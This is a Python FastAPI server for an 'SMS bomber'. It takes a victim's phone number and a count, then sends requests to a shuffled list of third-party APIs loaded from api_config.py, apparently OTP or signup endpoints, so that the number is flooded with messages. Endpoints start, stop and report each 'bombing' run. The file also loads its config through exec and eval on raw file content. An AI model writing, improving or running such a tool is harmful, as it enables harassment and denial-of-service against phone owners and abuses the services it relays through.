
import asyncio
import json
import random
import requests
from fastapi import FastAPI, BackgroundTasks
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Any

# Import the API list
try:
    try:
        from .api_config import apis
    except (ImportError, ValueError):
        from api_config import apis
except ImportError:
    # If the file structure is slightly different or it's a list in a variable
    # We might need to handle how it's defined in api_config.py
    # Let's assume it's a variable named 'apis'
    # Actually, looking at the file earlier, it was a list of dicts.
    # If it's not assigned to a variable, we might need to load it differently.
    import sys
    import os
    sys.path.append(os.getcwd())
    # We might need to read the file and evaluate it if it's just a raw list
    with open('api_config.py', 'r', encoding='utf-8') as f:
        content = f.read()
        # Find the list. It starts with [ and ends with ]
        # We need to make sure we have 'json' and 'random' available for lambdas
        import json as json_mod
        import random as random_mod
        # Define the environment for eval
        env = {'json': json_mod, 'random': random_mod}
        # The file content itself might be the list definition
        # or it might be apis = [...]
        if 'apis =' in content:
            exec(content, env)
            apis = env['apis']
        else:
            # Try to eval the whole thing if it's just a list
            try:
                apis = eval(content, env)
            except:
                # Fallback: find the first '[' and last ']'
                start = content.find('[')
                end = content.rfind(']') + 1
                apis = eval(content[start:end], env)

app = FastAPI()

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class BombRequest(BaseModel):
    phone: str
    count: int = 10

# In-memory status tracking
bombing_status = {}
stop_signals = set()

async def send_bomb(phone: str, count: int, bomb_id: str):
    # Ensure total and sent are always integers to prevent NaN on frontend
    bombing_status[bomb_id] = {"status": "running", "sent": 0, "total": count, "logs": []}
    
    # Shuffle APIs to be less predictable
    local_apis = apis.copy()
    random.shuffle(local_apis)
    
    sent_count = 0
    # Limit to count or available APIs
    max_to_send = min(count, len(local_apis))
    
    for i in range(max_to_send):
        if bomb_id in stop_signals:
            bombing_status[bomb_id]["status"] = "stopped"
            bombing_status[bomb_id]["logs"].append("Operation stopped by user.")
            stop_signals.remove(bomb_id)
            return

        api = local_apis[i]
        url = api["url"]
        method = api["method"]
        headers = api.get("headers", {})
        data_func = api.get("data")
        
        # Format URL if it's a template
        formatted_url = url.replace("{phone}", phone)
        
        payload = None
        if data_func:
            try:
                if callable(data_func):
                    payload = data_func(phone)
                else:
                    payload = data_func.replace("{phone}", phone)
            except Exception as e:
                continue

        try:
            # Mask URL for logs
            masked_url = f"API_{i+1} [****{url[-4:] if len(url)>4 else ''}]"
            
            # Use a timeout to not get stuck
            if method == "POST":
                # Handle string vs dict payload
                if isinstance(payload, str):
                    try:
                        json_payload = json.loads(payload)
                        response = requests.post(formatted_url, json=json_payload, headers=headers, timeout=5)
                    except:
                        response = requests.post(formatted_url, data=payload, headers=headers, timeout=5)
                else:
                    response = requests.post(formatted_url, json=payload, headers=headers, timeout=5)
            else:
                response = requests.get(formatted_url, headers=headers, timeout=5)
            
            sent_count += 1
            bombing_status[bomb_id]["sent"] = sent_count
            bombing_status[bomb_id]["logs"].append(f"Success: {masked_url}")
            
        except Exception as e:
             # Masked log even on failure
             masked_url = f"API_{i+1}"
             bombing_status[bomb_id]["logs"].append(f"Failed: {masked_url}")
            
        # Small delay to avoid overloading
        await asyncio.sleep(0.5)

    bombing_status[bomb_id]["status"] = "completed"

@app.post("/api/bomb")
async def start_bombing(request: BombRequest, background_tasks: BackgroundTasks):
    bomb_id = f"bomb_{random.randint(1000, 9999)}_{int(asyncio.get_event_loop().time())}"
    # Pre-initialize status to avoid frontend race condition
    bombing_status[bomb_id] = {"status": "starting", "sent": 0, "total": request.count, "logs": []}
    background_tasks.add_task(send_bomb, request.phone, request.count, bomb_id)
    return {"bomb_id": bomb_id, "message": "Bombing started"}

@app.post("/api/stop/{bomb_id}")
async def stop_bombing(bomb_id: str):
    if bomb_id in bombing_status and bombing_status[bomb_id]["status"] == "running":
        stop_signals.add(bomb_id)
        return {"message": "Stop signal sent"}
    return {"message": "Invalid bomb ID or not running"}

@app.get("/api/status/{bomb_id}")
async def get_status(bomb_id: str):
    return bombing_status.get(bomb_id, {"status": "not_found", "sent": 0, "total": 1})

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
